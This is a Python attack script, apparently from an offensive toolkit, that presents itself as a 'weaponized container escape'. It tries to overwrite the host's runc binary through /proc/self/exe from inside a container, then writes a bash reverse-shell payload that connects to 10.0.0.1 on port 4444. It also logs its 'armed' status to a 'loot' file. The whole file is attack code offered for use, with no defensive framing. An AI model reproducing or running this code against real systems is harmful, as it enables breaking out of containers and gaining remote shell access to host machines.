import os
import sys
import time

def escape_container():
    """
    Weaponized Container Escape: Attempts to overwrite the host's 
    runc binary by exploiting /proc/self/exe within a container.
    """
    print("[*] Initializing Container Escape Sequence...")
    
    # Check if we are actually in a container
    if not os.path.exists("/.dockerenv") and not os.path.exists("/run/secrets/kubernetes.io"):
        print("[-] Not a container environment. Escape logic may fail.")

    try:
        # Path to the runc binary as seen from inside the container
        # during an 'exec' session.
        target_path = "/proc/self/exe"
        
        print(f"[*] Targeting Host Runtime via {target_path}")

        # Open the host's runc binary for reading to get a file descriptor
        fd = os.open(target_path, os.O_RDONLY)
        if fd < 0:
            print("[-] Failed to secure file descriptor.")
            return

        print(f"[!] File descriptor {fd} secured. Waiting for host execution...")

        # We must wait for the host to execute 'docker exec' or similar
        # which opens the runc binary in a writable state.
        while True:
            try:
                # Attempt to reopen the FD in O_WRONLY mode
                # This fails until the host re-executes runc
                with open(f"/proc/self/fd/{fd}", "wb") as f:
                    payload = b"#!/bin/bash\n# Chimera Host Payload\n/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"
                    f.write(payload)
                    print("[!!!] SUCCESS: Host runc overwritten. Payload armed.")
                    break
            except IOError:
                # Host hasn't triggered runc yet
                time.sleep(0.1)

        # Log to project loot
        loot_path = "../../../loot/forensic_history.log"
        with open(loot_path, "a") as log:
            log.write(f"Type: CONTAINER_ESCAPE | Status: ARMED | Target: RUNC\n")

    except Exception as e:
        print(f"[-] Escape Fault: {e}")

if __name__ == "__main__":
    escape_container()
